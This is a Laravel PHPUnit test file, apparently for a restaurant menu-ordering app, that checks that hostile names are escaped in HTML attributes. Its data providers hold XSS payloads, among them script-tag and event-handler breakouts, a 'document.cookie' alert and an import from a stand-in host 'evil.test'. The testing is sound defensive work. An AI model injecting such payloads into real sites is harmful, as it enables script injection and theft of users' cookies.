<?php

namespace Tests\Feature;

use App\Models\Categoria;
use App\Models\CategoriaTraduccion;
use App\Models\Horario;
use App\Models\Producto;
use App\Models\ProductoTraduccion;
use App\Models\ProductoVariante;
use App\Models\Restaurante;
use App\Models\Scopes\RestauranteScope;
use App\Models\VarianteTraduccion;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\Concerns\LeeElPedidoDelMenuPublico;
use Tests\TestCase;

class MenuPublicoContextoJsTest extends TestCase
{
    use LeeElPedidoDelMenuPublico;
    use RefreshDatabase;

    protected function tearDown(): void
    {
        RestauranteScope::setRestauranteId(null);
        parent::tearDown();
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function nombresHostiles(): array
    {
        return [
            'template literal' => ['Tacos ${alert(1)} `x` ${import(`//evil.test/a.js`)}', 'tacos-template'],
            'cierre de script' => ['</script><img src=x onerror=alert(1)>', 'tacos-script'],
            'barra invertida final' => ['Tacos del Norte\\', 'tacos-barra'],
            // El nombre es hostil; el slug ya no puede serlo: /{slug} solo admite [a-z0-9-].
            'apostrofo y comillas' => ['Tony\'s "Special"', 'tonys-special'],
        ];
    }

    /**
     * @return array{restaurante: Restaurante, producto: string, variante: string}
     */
    private function crearMenuPedible(string $nombre, string $slug): array
    {
        $restaurante = Restaurante::factory()->create([
            'nombre' => $nombre,
            'slug' => $slug,
            'pedidos_activos' => true,
            'whatsapp_pedidos' => '525512345678',
        ]);
        foreach (range(0, 6) as $dia) {
            Horario::factory()->create([
                'restaurante_id' => $restaurante->id,
                'dia_semana' => $dia,
                'abre' => '00:00:00',
                'cierra' => '23:59:59',
                'cerrado' => false,
            ]);
        }

        $categoria = Categoria::factory()->create(['restaurante_id' => $restaurante->id]);
        CategoriaTraduccion::factory()->create(['categoria_id' => $categoria->id, 'idioma' => 'es', 'nombre' => 'Entradas']);

        $nombreProducto = 'Plato `${x}` "q" \'a\' \\';
        $nombreVariante = 'Grande `${y}` "v" \'b\' \\';

        $simple = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
            'precio' => 50,
            'precio_oferta' => null,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $simple->id, 'idioma' => 'es', 'nombre' => $nombreProducto]);

        $conVariante = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $conVariante->id, 'idioma' => 'es', 'nombre' => $nombreProducto]);
        $variante = ProductoVariante::factory()->create(['producto_id' => $conVariante->id, 'precio' => 80, 'disponible' => true]);
        VarianteTraduccion::factory()->create(['variante_id' => $variante->id, 'idioma' => 'es', 'nombre' => $nombreVariante]);

        return ['restaurante' => $restaurante, 'producto' => $nombreProducto, 'variante' => $nombreVariante];
    }

    #[DataProvider('nombresHostiles')]
    public function test_los_datos_del_pedido_llegan_como_atributos_escapados_y_no_como_script(string $nombre, string $slug): void
    {
        $menu = $this->crearMenuPedible($nombre, $slug);

        $html = $this->get(route('menu.publico', ['slug' => $slug]))->assertOk()->getContent();
        $atributos = $this->atributosDelContenedorDePedido($html);

        // Decodificados por un parser HTML real, los atributos devuelven exactamente lo que escribió el dueño.
        $this->assertSame($nombre, $atributos['restaurante']);
        $this->assertSame('menuonl_cart_m_'.$slug, $atributos['clave']);
        $this->assertSame('menuonl_cart_'.$slug, $atributos['clave-antigua']);
        $this->assertSame($menu['restaurante']->moneda, $atributos['moneda']);
        $this->assertSame('525512345678', $atributos['numero']);
        $this->assertStringNotContainsString('</script><img', $html);
        $this->assertStringNotContainsString('<img src=x', $html);
        $this->assertSinScriptNiManejadoresDelPedido($html);
    }

    public function test_un_apostrofo_se_decodifica_bien_en_el_atributo_y_no_queda_doble_codificado(): void
    {
        $this->crearMenuPedible("Tony's \"Special\"", 'tonys-special');

        $html = $this->get(route('menu.publico', ['slug' => 'tonys-special']))->assertOk()->getContent();

        $this->assertSame("Tony's \"Special\"", $this->atributosDelContenedorDePedido($html)['restaurante']);
        $this->assertStringNotContainsString('&amp;#039;', $html);
        $this->assertStringNotContainsString('&amp;quot;', $html);
    }

    public function test_el_formato_del_mensaje_aprobado_vive_en_el_modulo_compartido(): void
    {
        $mensaje = (string) file_get_contents(resource_path('js/pedido/mensaje.js'));

        // Estructura aprobada en ecf3c15; ahora la arma pedido/mensaje.js y la fija tests/Js/menu-publico-pedido.test.mjs contra la referencia.
        $this->assertStringContainsString('Hola, quiero pedir en *${restaurante}*:\n\n', $mensaje);
        $this->assertStringContainsString('*Mesa:* ${mesaTexto}\n\n', $mensaje);
        $this->assertStringContainsString('*Pedido:*\n${items}\n', $mensaje);
        $this->assertStringContainsString('*Nota para la cocina:* ${cocina}\n\n', $mensaje);
        $this->assertStringContainsString('*Total:* ${formatear(total)}', $mensaje);
        $this->assertStringContainsString("|| 'Para llevar'", $mensaje);

        // Textos anteriores obsoletos no deben existir
        foreach (['¡Hola! Quiero hacer el siguiente pedido', '*Ubicación/Mesa:*', '*Detalle del pedido:*', '*Indicaciones:*', '*Total estimado:*', 'Para llevar / Sin mesa'] as $obsoleto) {
            $this->assertStringNotContainsString($obsoleto, $mensaje);
        }
    }

    public function test_los_botones_de_agregar_al_carrito_no_se_rompen_con_nombres_hostiles(): void
    {
        $menu = $this->crearMenuPedible("Tony's \"Special\"", 'tonys-special');

        $html = $this->get(route('menu.publico', ['slug' => 'tonys-special']))->assertOk()->getContent();
        $botones = $this->botonesDeAgregar($html);

        $this->assertCount(2, $botones, 'Se esperaban dos botones de agregar (simple y con variante).');
        usort($botones, fn (array $a, array $b): int => strcmp($a['variante'], $b['variante']));
        $this->assertSame([$menu['producto'], $menu['producto']], array_column($botones, 'nombre'));
        $this->assertContains($menu['variante'], array_column($botones, 'nombre-variante'));
        $this->assertSame('', $botones[0]['variante'], 'El platillo simple no manda variante.');
        $this->assertMatchesRegularExpression('/\A\d+\z/', $botones[1]['variante']);
        $this->assertMatchesRegularExpression('/\A\d{1,8}\.\d{2}\z/', $botones[0]['precio']);
        $this->assertMatchesRegularExpression('/\A\d{1,8}\.\d{2}\z/', $botones[1]['precio']);
        $this->assertSinScriptNiManejadoresDelPedido($html);
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function matrizAtaquesAtributosXss(): array
    {
        return [
            'escape con comillas dobles y handler onmouseover' => ['" onmouseover="alert(1)'],
            'escape de tag y script malicioso' => ['"><script>alert(1)</script><div class="'],
            'salto de linea y comillas para romper atributo' => ["Platillo \n con salto de linea y \" onfocus=\"alert(1)"],
            'separadores de linea unicode U+2028 y U+2029' => ["Unicode \u{2028} and \u{2029} test \" onclick=\"alert(1)"],
            'apostrofos comillas y script anidado' => ['Tony\'s \' "Special" <script>alert(\'xss\')</script> \\'],
            'autofocus y onfocus para ejecucion inmediata' => ['test" autofocus onfocus="alert(document.cookie)'],
        ];
    }

    /**
     * Test hostile attribute breakout XSS payload matrix on dish card buttons and onclick handlers
     * (double quotes, newlines, line separators, scripts) confirming safe escaping.
     */
    #[DataProvider('matrizAtaquesAtributosXss')]
    public function test_matriz_hostil_xss_en_onclick_y_atributos_dish_card(string $payload): void
    {
        $slug = 'xss-'.substr(md5($payload), 0, 8);
        $restaurante = Restaurante::factory()->create([
            'nombre' => 'Resto XSS Test',
            'slug' => $slug,
            'pedidos_activos' => true,
            'whatsapp_pedidos' => '525512345678',
        ]);
        foreach (range(0, 6) as $dia) {
            Horario::factory()->create([
                'restaurante_id' => $restaurante->id,
                'dia_semana' => $dia,
                'abre' => '00:00:00',
                'cierra' => '23:59:59',
                'cerrado' => false,
            ]);
        }

        $categoria = Categoria::factory()->create(['restaurante_id' => $restaurante->id]);
        CategoriaTraduccion::factory()->create(['categoria_id' => $categoria->id, 'idioma' => 'es', 'nombre' => 'Entradas']);

        // 1. Platillo simple
        $simple = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
            'precio' => 50,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $simple->id, 'idioma' => 'es', 'nombre' => $payload]);

        // 2. Platillo con variantes
        $conVariante = Producto::factory()->create([
            'restaurante_id' => $restaurante->id,
            'categoria_id' => $categoria->id,
            'disponible' => true,
            'visible' => true,
        ]);
        ProductoTraduccion::factory()->create(['producto_id' => $conVariante->id, 'idioma' => 'es', 'nombre' => $payload]);
        $var = ProductoVariante::factory()->create(['producto_id' => $conVariante->id, 'precio' => 75, 'disponible' => true]);
        VarianteTraduccion::factory()->create(['variante_id' => $var->id, 'idioma' => 'es', 'nombre' => $payload]);

        $respuesta = $this->get(route('menu.publico', ['slug' => $slug]));
        $respuesta->assertOk();
        $html = $respuesta->getContent();

        // Verificar que ningún atributo malicioso rompió las comillas para inyectar un atributo HTML real
        $this->assertDoesNotMatchRegularExpression('/"\s+(onmouseover|onfocus|autofocus)=/i', $html, 'No debe existir inyección de manejadores de eventos o autofocus fuera de atributos entrecomillados.');
        $this->assertStringNotContainsString('onmouseover="', $html);
        $this->assertStringNotContainsString('onfocus="', $html);

        // Verificar que no existen tags <script> no autorizados
        $this->assertStringNotContainsString('<script>alert(', $html);
        $this->assertSinScriptNiManejadoresDelPedido($html);

        // Los 2 botones de agregar al pedido siguen completos y devuelven el nombre original (sin romper el atributo)
        $botones = $this->botonesDeAgregar($html);
        $this->assertCount(2, $botones, 'Los 2 botones deben conservar sus atributos data-* bien cerrados sin ser partidos por comillas dobles.');
        $this->assertSame([$payload, $payload], array_column($botones, 'nombre'));
        $this->assertContains($payload, array_column($botones, 'nombre-variante'));

        // Verificar que en atributos aria-label las comillas dobles están codificadas como entidades HTML
        if (str_contains($payload, '"')) {
            $this->assertStringNotContainsString('aria-label="Agregar '.$payload, $html);
            $this->assertStringContainsString('&quot;', $html);
        }
    }
}
